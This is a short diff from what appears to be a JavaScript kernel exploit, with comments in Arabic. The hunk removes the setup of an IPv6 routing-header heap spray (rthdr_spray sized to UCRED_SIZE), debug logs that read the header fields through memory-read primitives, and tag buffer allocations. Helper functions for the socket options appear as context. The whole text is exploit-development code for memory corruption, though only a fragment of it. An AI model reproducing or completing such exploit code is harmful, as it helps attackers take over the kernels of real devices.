@@ -270,21 +270,6 @@ get_sockopt = function(sd, level, optname, optval, optlen) {
   return out_len;
 };
 
-// 1) نفس فكرة rthdr_spray في Lua
-var rthdr_spray = malloc(UCRED_SIZE);
-fill_buffer_64(rthdr_spray, new BigInt(0), UCRED_SIZE);
-
-var rthdr_spray_len = build_rthdr(rthdr_spray, UCRED_SIZE);
-
-// هنا بالضبط تحط اللوجات
-log("[HDR] nxt=" + read8(rthdr_spray));
-log("[HDR] len=" + read8(rthdr_spray.add(1)));
-log("[HDR] type=" + read8(rthdr_spray.add(2)));
-log("[HDR] segleft=" + read8(rthdr_spray.add(3)));
-
-// 2) نفس فكرة tag_buf و tag_len
-var tag_buf = malloc(0x10);
-var tag_len = malloc(4);
 
 // 3) set_rthdr / get_rthdr زي ما اتفقنا قبل كده
 function _set_rthdr_raw(sd, buf, len) {
